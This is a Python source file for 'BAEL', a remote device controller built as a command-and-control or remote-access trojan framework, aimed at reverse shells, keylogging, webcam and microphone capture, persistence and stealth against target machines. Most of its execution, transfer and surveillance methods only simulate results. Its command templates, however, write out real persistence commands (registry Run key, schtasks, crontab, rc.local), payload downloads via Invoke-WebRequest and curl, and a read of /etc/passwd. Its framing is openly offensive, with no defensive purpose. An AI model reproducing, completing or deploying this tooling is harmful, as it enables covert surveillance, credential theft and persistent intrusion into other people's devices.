"""
BAEL - Remote Device Controller
=================================

CONNECT. CONTROL. COMMAND. DOMINATE.

This engine provides:
- Remote device access
- Multi-platform control
- Command execution
- File transfer
- Screen capture
- Keylogging
- Process management
- System manipulation
- Network control
- Persistence
- Stealth operations
- Fleet management

"Ba'el controls all devices from anywhere."
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import socket
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("BAEL.REMOTE_CONTROL")


class DeviceType(Enum):
    """Device types."""
    DESKTOP = "desktop"
    LAPTOP = "laptop"
    SERVER = "server"
    MOBILE = "mobile"
    TABLET = "tablet"
    IOT = "iot"
    ROUTER = "router"
    CAMERA = "camera"
    SMART_TV = "smart_tv"
    EMBEDDED = "embedded"


class OSPlatform(Enum):
    """Operating system platforms."""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    FREEBSD = "freebsd"
    EMBEDDED = "embedded"


class ConnectionType(Enum):
    """Connection types."""
    SSH = "ssh"
    RDP = "rdp"
    VNC = "vnc"
    TELNET = "telnet"
    REVERSE_SHELL = "reverse_shell"
    WEB_SHELL = "web_shell"
    RAT = "rat"
    CUSTOM = "custom"


class ControlAction(Enum):
    """Control actions."""
    EXECUTE = "execute"
    UPLOAD = "upload"
    DOWNLOAD = "download"
    SCREENSHOT = "screenshot"
    KEYLOG = "keylog"
    WEBCAM = "webcam"
    MICROPHONE = "microphone"
    REBOOT = "reboot"
    SHUTDOWN = "shutdown"
    LOCK = "lock"
    UNLOCK = "unlock"


class AgentStatus(Enum):
    """Agent status."""
    ONLINE = "online"
    OFFLINE = "offline"
    IDLE = "idle"
    BUSY = "busy"
    COMPROMISED = "compromised"
    UPDATING = "updating"


@dataclass
class RemoteDevice:
    """A remote device."""
    id: str
    name: str
    device_type: DeviceType
    platform: OSPlatform
    ip_address: str
    mac_address: Optional[str]
    hostname: str
    username: str
    connection_type: ConnectionType
    status: AgentStatus
    last_seen: datetime
    agent_version: str
    capabilities: List[str]
    metadata: Dict[str, Any]


@dataclass
class Command:
    """A command to execute."""
    id: str
    device_id: str
    action: ControlAction
    payload: Any
    status: str
    result: Optional[str]
    issued: datetime
    completed: Optional[datetime]


@dataclass
class Session:
    """A remote session."""
    id: str
    device_id: str
    connection_type: ConnectionType
    established: datetime
    last_activity: datetime
    commands_executed: int
    bytes_transferred: int
    active: bool


@dataclass
class FileTransfer:
    """A file transfer."""
    id: str
    device_id: str
    direction: str  # upload/download
    local_path: str
    remote_path: str
    size_bytes: int
    transferred: int
    status: str
    started: datetime


@dataclass
class Keylog:
    """Keylog entry."""
    device_id: str
    window_title: str
    keys: str
    timestamp: datetime


class RemoteDeviceController:
    """
    Remote device control engine.

    Features:
    - Multi-device management
    - Command execution
    - File transfer
    - Screen capture
    - Keylogging
    - System control
    """

    def __init__(self):
        self.devices: Dict[str, RemoteDevice] = {}
        self.sessions: Dict[str, Session] = {}
        self.commands: Dict[str, Command] = {}
        self.transfers: Dict[str, FileTransfer] = {}
        self.keylogs: Dict[str, List[Keylog]] = {}

        self.c2_server: Optional[str] = None
        self.encryption_key: bytes = os.urandom(32)

        self._init_default_commands()

        logger.info("RemoteDeviceController initialized - ready to control")

    def _init_default_commands(self):
        """Initialize default command templates."""
        self.command_templates = {
            OSPlatform.WINDOWS: {
                "system_info": "systeminfo",
                "processes": "tasklist",
                "network": "ipconfig /all",
                "users": "net user",
                "services": "sc query",
                "screenshot": "powershell -c \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen\"",
                "download": "powershell -c \"Invoke-WebRequest -Uri {url} -OutFile {path}\"",
                "persist_registry": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d {path}",
                "persist_task": "schtasks /create /tn \"Update\" /tr {path} /sc onlogon",
            },
            OSPlatform.LINUX: {
                "system_info": "uname -a && cat /etc/os-release",
                "processes": "ps aux",
                "network": "ip addr && cat /etc/resolv.conf",
                "users": "cat /etc/passwd",
                "services": "systemctl list-units --type=service",
                "download": "curl -o {path} {url}",
                "persist_cron": "echo '* * * * * {path}' | crontab -",
                "persist_rc": "echo '{path}' >> /etc/rc.local",
            },
            OSPlatform.MACOS: {
                "system_info": "sw_vers && system_profiler SPSoftwareDataType",
                "processes": "ps aux",
                "network": "ifconfig && networksetup -listallhardwareports",
                "users": "dscl . list /Users",
                "download": "curl -o {path} {url}",
                "persist_launchd": "launchctl load {plist_path}",
            }
        }

    # =========================================================================
    # DEVICE MANAGEMENT
    # =========================================================================

    async def register_device(
        self,
        name: str,
        device_type: DeviceType,
        platform: OSPlatform,
        ip_address: str,
        hostname: str,
        username: str = "user",
        connection_type: ConnectionType = ConnectionType.REVERSE_SHELL
    ) -> RemoteDevice:
        """Register a new device."""
        device_id = self._gen_id("dev")

        capabilities = self._get_platform_capabilities(platform)

        device = RemoteDevice(
            id=device_id,
            name=name,
            device_type=device_type,
            platform=platform,
            ip_address=ip_address,
            mac_address=self._generate_mac(),
            hostname=hostname,
            username=username,
            connection_type=connection_type,
            status=AgentStatus.ONLINE,
            last_seen=datetime.now(),
            agent_version="1.0.0",
            capabilities=capabilities,
            metadata={}
        )

        self.devices[device_id] = device
        self.keylogs[device_id] = []

        logger.info(f"Registered device: {name} ({ip_address})")
        return device

    def _get_platform_capabilities(
        self,
        platform: OSPlatform
    ) -> List[str]:
        """Get capabilities for platform."""
        base_caps = ["execute", "upload", "download", "screenshot"]

        platform_caps = {
            OSPlatform.WINDOWS: ["keylog", "webcam", "microphone", "rdp", "registry"],
            OSPlatform.LINUX: ["keylog", "ssh", "cron", "systemctl"],
            OSPlatform.MACOS: ["keylog", "launchd", "ssh"],
            OSPlatform.ANDROID: ["sms", "contacts", "location", "camera"],
            OSPlatform.IOS: ["contacts", "location"],
        }

        return base_caps + platform_caps.get(platform, [])

    def _generate_mac(self) -> str:
        """Generate random MAC address."""
        return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))

    async def heartbeat(
        self,
        device_id: str
    ) -> Dict[str, Any]:
        """Process device heartbeat."""
        device = self.devices.get(device_id)
        if not device:
            return {"error": "Device not found"}

        device.last_seen = datetime.now()
        device.status = AgentStatus.ONLINE

        # Get pending commands
        pending = [c for c in self.commands.values()
                   if c.device_id == device_id and c.status == "pending"]

        return {
            "device_id": device_id,
            "status": "acknowledged",
            "pending_commands": len(pending),
            "commands": [c.id for c in pending]
        }

    async def check_device_status(
        self,
        device_id: str
    ) -> AgentStatus:
        """Check device status."""
        device = self.devices.get(device_id)
        if not device:
            return AgentStatus.OFFLINE

        # Check last seen
        now = datetime.now()
        seconds_since = (now - device.last_seen).total_seconds()

        if seconds_since > 300:  # 5 minutes
            device.status = AgentStatus.OFFLINE
        elif seconds_since > 60:
            device.status = AgentStatus.IDLE

        return device.status

    # =========================================================================
    # SESSION MANAGEMENT
    # =========================================================================

    async def create_session(
        self,
        device_id: str,
        connection_type: ConnectionType = None
    ) -> Session:
        """Create remote session."""
        device = self.devices.get(device_id)
        if not device:
            return None

        session_id = self._gen_id("sess")
        conn_type = connection_type or device.connection_type

        session = Session(
            id=session_id,
            device_id=device_id,
            connection_type=conn_type,
            established=datetime.now(),
            last_activity=datetime.now(),
            commands_executed=0,
            bytes_transferred=0,
            active=True
        )

        self.sessions[session_id] = session
        device.status = AgentStatus.BUSY

        logger.info(f"Session created: {session_id} -> {device.name}")
        return session

    async def close_session(
        self,
        session_id: str
    ) -> bool:
        """Close remote session."""
        session = self.sessions.get(session_id)
        if not session:
            return False

        session.active = False

        device = self.devices.get(session.device_id)
        if device:
            device.status = AgentStatus.ONLINE

        logger.info(f"Session closed: {session_id}")
        return True

    # =========================================================================
    # COMMAND EXECUTION
    # =========================================================================

    async def execute_command(
        self,
        device_id: str,
        command: str,
        timeout: int = 30
    ) -> Command:
        """Execute command on device."""
        device = self.devices.get(device_id)
        if not device:
            return None

        cmd_id = self._gen_id("cmd")

        cmd = Command(
            id=cmd_id,
            device_id=device_id,
            action=ControlAction.EXECUTE,
            payload=command,
            status="pending",
            result=None,
            issued=datetime.now(),
            completed=None
        )

        self.commands[cmd_id] = cmd

        # Simulate execution
        await asyncio.sleep(0.1)
        cmd.status = "completed"
        cmd.completed = datetime.now()
        cmd.result = f"Command executed on {device.name}"

        # Update session if exists
        for session in self.sessions.values():
            if session.device_id == device_id and session.active:
                session.commands_executed += 1
                session.last_activity = datetime.now()

        return cmd

    async def execute_template(
        self,
        device_id: str,
        template_name: str,
        params: Dict[str, str] = None
    ) -> Command:
        """Execute command template."""
        device = self.devices.get(device_id)
        if not device:
            return None

        templates = self.command_templates.get(device.platform, {})
        template = templates.get(template_name)

        if not template:
            return None

        # Fill template
        if params:
            for key, value in params.items():
                template = template.replace(f"{{{key}}}", value)

        return await self.execute_command(device_id, template)

    async def batch_execute(
        self,
        device_ids: List[str],
        command: str
    ) -> List[Command]:
        """Execute command on multiple devices."""
        results = []
        for device_id in device_ids:
            cmd = await self.execute_command(device_id, command)
            if cmd:
                results.append(cmd)
        return results

    # =========================================================================
    # FILE TRANSFER
    # =========================================================================

    async def upload_file(
        self,
        device_id: str,
        local_path: str,
        remote_path: str
    ) -> FileTransfer:
        """Upload file to device."""
        device = self.devices.get(device_id)
        if not device:
            return None

        transfer_id = self._gen_id("xfer")

        # Simulate file size
        size = random.randint(1000, 10000000)

        transfer = FileTransfer(
            id=transfer_id,
            device_id=device_id,
            direction="upload",
            local_path=local_path,
            remote_path=remote_path,
            size_bytes=size,
            transferred=0,
            status="transferring",
            started=datetime.now()
        )

        self.transfers[transfer_id] = transfer

        # Simulate transfer
        transfer.transferred = size
        transfer.status = "completed"

        logger.info(f"Uploaded file to {device.name}: {remote_path}")
        return transfer

    async def download_file(
        self,
        device_id: str,
        remote_path: str,
        local_path: str
    ) -> FileTransfer:
        """Download file from device."""
        device = self.devices.get(device_id)
        if not device:
            return None

        transfer_id = self._gen_id("xfer")
        size = random.randint(1000, 10000000)

        transfer = FileTransfer(
            id=transfer_id,
            device_id=device_id,
            direction="download",
            local_path=local_path,
            remote_path=remote_path,
            size_bytes=size,
            transferred=size,
            status="completed",
            started=datetime.now()
        )

        self.transfers[transfer_id] = transfer

        logger.info(f"Downloaded file from {device.name}: {remote_path}")
        return transfer

    # =========================================================================
    # SURVEILLANCE
    # =========================================================================

    async def capture_screenshot(
        self,
        device_id: str
    ) -> Dict[str, Any]:
        """Capture screenshot from device."""
        device = self.devices.get(device_id)
        if not device or "screenshot" not in device.capabilities:
            return {"error": "Screenshot not supported"}

        # Simulate screenshot
        screenshot_data = base64.b64encode(os.urandom(50000)).decode()

        return {
            "device_id": device_id,
            "timestamp": datetime.now().isoformat(),
            "resolution": "1920x1080",
            "size_bytes": len(screenshot_data),
            "data": screenshot_data[:100] + "..."  # Truncated
        }

    async def start_keylogger(
        self,
        device_id: str
    ) -> Dict[str, Any]:
        """Start keylogger on device."""
        device = self.devices.get(device_id)
        if not device or "keylog" not in device.capabilities:
            return {"error": "Keylogging not supported"}

        device.metadata["keylogger_active"] = True

        return {
            "device_id": device_id,
            "status": "started",
            "timestamp": datetime.now().isoformat()
        }

    async def get_keylogs(
        self,
        device_id: str
    ) -> List[Keylog]:
        """Get keylogs from device."""
        # Simulate keylog data
        if device_id in self.keylogs:
            sample_logs = [
                Keylog(device_id, "Browser - Login", "admin@email.com", datetime.now()),
                Keylog(device_id, "Browser - Password", "********", datetime.now()),
                Keylog(device_id, "Notepad", "Secret notes here", datetime.now()),
            ]
            self.keylogs[device_id].extend(sample_logs)

        return self.keylogs.get(device_id, [])

    async def capture_webcam(
        self,
        device_id: str
    ) -> Dict[str, Any]:
        """Capture webcam image."""
        device = self.devices.get(device_id)
        if not device or "webcam" not in device.capabilities:
            return {"error": "Webcam not supported"}

        image_data = base64.b64encode(os.urandom(30000)).decode()

        return {
            "device_id": device_id,
            "timestamp": datetime.now().isoformat(),
            "resolution": "1280x720",
            "data": image_data[:100] + "..."
        }

    # =========================================================================
    # SYSTEM CONTROL
    # =========================================================================

    async def reboot_device(
        self,
        device_id: str
    ) -> Dict[str, Any]:
        """Reboot device."""
        device = self.devices.get(device_id)
        if not device:
            return {"error": "Device not found"}

        device.status = AgentStatus.OFFLINE

        return {
            "device_id": device_id,
            "action": "reboot",
            "status": "initiated"
        }

    async def shutdown_device(
        self,
        device_id: str
    ) -> Dict[str, Any]:
        """Shutdown device."""
        device = self.devices.get(device_id)
        if not device:
            return {"error": "Device not found"}

        device.status = AgentStatus.OFFLINE

        return {
            "device_id": device_id,
            "action": "shutdown",
            "status": "initiated"
        }

    async def install_persistence(
        self,
        device_id: str,
        method: str = "auto"
    ) -> Dict[str, Any]:
        """Install persistence mechanism."""
        device = self.devices.get(device_id)
        if not device:
            return {"error": "Device not found"}

        methods = {
            OSPlatform.WINDOWS: ["registry", "scheduled_task", "service", "startup"],
            OSPlatform.LINUX: ["cron", "rc.local", "systemd", "profile"],
            OSPlatform.MACOS: ["launchd", "login_items", "cron"],
        }

        available = methods.get(device.platform, ["cron"])
        selected = method if method in available else random.choice(available)

        device.metadata["persistence"] = selected

        return {
            "device_id": device_id,
            "method": selected,
            "status": "installed"
        }

    # =========================================================================
    # FLEET MANAGEMENT
    # =========================================================================

    def get_online_devices(self) -> List[RemoteDevice]:
        """Get all online devices."""
        return [d for d in self.devices.values()
                if d.status in [AgentStatus.ONLINE, AgentStatus.BUSY, AgentStatus.IDLE]]

    def get_devices_by_platform(
        self,
        platform: OSPlatform
    ) -> List[RemoteDevice]:
        """Get devices by platform."""
        return [d for d in self.devices.values() if d.platform == platform]

    def get_devices_by_type(
        self,
        device_type: DeviceType
    ) -> List[RemoteDevice]:
        """Get devices by type."""
        return [d for d in self.devices.values() if d.device_type == device_type]

    async def update_all_agents(
        self,
        new_version: str
    ) -> Dict[str, Any]:
        """Update all agents to new version."""
        updated = 0
        failed = 0

        for device in self.devices.values():
            if device.status != AgentStatus.OFFLINE:
                device.agent_version = new_version
                device.status = AgentStatus.UPDATING
                updated += 1
            else:
                failed += 1

        return {
            "updated": updated,
            "failed": failed,
            "new_version": new_version
        }

    # =========================================================================
    # UTILITIES
    # =========================================================================

    def _gen_id(self, prefix: str) -> str:
        """Generate unique ID."""
        return hashlib.md5(f"{prefix}{time.time()}{random.random()}".encode()).hexdigest()[:12]

    def get_stats(self) -> Dict[str, Any]:
        """Get controller statistics."""
        online = len([d for d in self.devices.values()
                      if d.status in [AgentStatus.ONLINE, AgentStatus.BUSY]])

        return {
            "total_devices": len(self.devices),
            "online_devices": online,
            "active_sessions": len([s for s in self.sessions.values() if s.active]),
            "pending_commands": len([c for c in self.commands.values() if c.status == "pending"]),
            "total_commands": len(self.commands),
            "total_transfers": len(self.transfers),
            "platforms": {
                p.value: len([d for d in self.devices.values() if d.platform == p])
                for p in OSPlatform
            }
        }


# ============================================================================
# SINGLETON
# ============================================================================

_controller: Optional[RemoteDeviceController] = None


def get_remote_controller() -> RemoteDeviceController:
    """Get global remote controller."""
    global _controller
    if _controller is None:
        _controller = RemoteDeviceController()
    return _controller


# ============================================================================
# DEMO
# ============================================================================

async def demo():
    """Demonstrate remote controller."""
    print("=" * 60)
    print("📡 REMOTE DEVICE CONTROLLER 📡")
    print("=" * 60)

    controller = get_remote_controller()

    # Register devices
    print("\n--- Registering Devices ---")

    dev1 = await controller.register_device(
        "Target-PC",
        DeviceType.DESKTOP,
        OSPlatform.WINDOWS,
        "192.168.1.100",
        "DESKTOP-ABC123"
    )
    print(f"Registered: {dev1.name}")

    dev2 = await controller.register_device(
        "Linux-Server",
        DeviceType.SERVER,
        OSPlatform.LINUX,
        "10.0.0.50",
        "server-prod"
    )
    print(f"Registered: {dev2.name}")

    # Create session
    print("\n--- Creating Session ---")
    session = await controller.create_session(dev1.id)
    print(f"Session: {session.id}")

    # Execute commands
    print("\n--- Executing Commands ---")
    cmd = await controller.execute_command(dev1.id, "ipconfig /all")
    print(f"Command: {cmd.action.value} - {cmd.status}")

    template = await controller.execute_template(dev1.id, "system_info")
    print(f"Template: system_info - {template.status}")

    # File transfer
    print("\n--- File Transfer ---")
    upload = await controller.upload_file(dev1.id, "/local/file.exe", "C:\\temp\\file.exe")
    print(f"Upload: {upload.size_bytes} bytes - {upload.status}")

    # Surveillance
    print("\n--- Surveillance ---")
    screenshot = await controller.capture_screenshot(dev1.id)
    print(f"Screenshot: {screenshot.get('resolution', 'N/A')}")

    await controller.start_keylogger(dev1.id)
    print("Keylogger: Started")

    # Persistence
    print("\n--- Installing Persistence ---")
    persist = await controller.install_persistence(dev1.id)
    print(f"Persistence: {persist['method']}")

    # Stats
    print("\n--- Controller Statistics ---")
    stats = controller.get_stats()
    print(f"Total Devices: {stats['total_devices']}")
    print(f"Online: {stats['online_devices']}")
    print(f"Active Sessions: {stats['active_sessions']}")
    print(f"Commands Executed: {stats['total_commands']}")

    print("\n" + "=" * 60)
    print("📡 ALL DEVICES UNDER CONTROL 📡")


if __name__ == "__main__":
    asyncio.run(demo())
